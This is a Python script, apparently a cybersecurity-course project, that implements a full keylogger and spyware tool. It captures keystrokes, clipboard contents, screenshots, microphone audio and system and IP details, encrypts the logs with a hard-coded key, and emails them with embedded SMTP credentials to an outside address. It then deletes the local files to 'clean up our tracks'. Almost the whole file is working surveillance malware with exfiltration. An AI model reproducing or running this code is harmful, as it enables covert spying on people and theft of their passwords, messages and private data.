# Libraries

# email libraries to let us use email features
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# default libraries for collecting computer information 
import socket
import platform

# clipboard
import win32clipboard

# grab keystrokes
# key logs the key and the listener listens for each key typed on the keyboard
from pynput.keyboard import Key, Listener

# to keep track of time
import time
import os

# for microphone capabilities
from scipy.io.wavfile import write 
import sounddevice as sd

# to encrypt our files we use this library
from cryptography.fernet import Fernet

# to get the system username
import getpass
# to get some more computer information
from requests import get

# for screenshotting capability and to take only one screenshot at a time
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# creating the keylogger 

# file path where the key_log.txt file will be stored
file_path = "P:\\0011 NOTES\\Intro to cybersecurity\\Cryptography_Project"
# to access the keylog.txt file
extend = "\\"
file_merge = file_path + extend

# constant variable declarations
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "dfc7ea343ea234" # Enter disposable email here
password = "2fb47ef0cab13d" # Enter email password here

username = getpass.getuser()

toaddr = "kala47jadu@gmail.com" # Enter the email address you want to send your information to

key = "f9VfhGNup8mj7XGmJxU6s9oyikPEwgm4p1mXpaeQyvc=" # Generate an encryption key from the Cryptography folder


# send email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    # MIME - Multi Internet Mail Extentions Internet protocol
    # helps to support character texts, email-attachments, video, audio, images ..etc
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail" 
    # attach the body to the msg
    msg.attach(MIMEText(body, 'plain'))
    
    # attachment variables
    filename = filename
    # open the attachment as read binary
    attachment = open(attachment, 'rb')
    
    # create mime base with default settings
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    # finish encoding 
    encoders.encode_base64(p)
    
    # add a header, attach the message, startup a instance, login to gmail account and send mail
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    # create the smtp session
    s = smtplib.SMTP('sandbox.smtp.mailtrap.io', 587)
    # starting up our tls to secure what we are trying to send
    s.starttls()
    # login to the session
    s.login(fromaddr, password)
    
    # convert the multipart message into a string to be able to send
    text = msg.as_string()
    # send and quit the session
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
    
   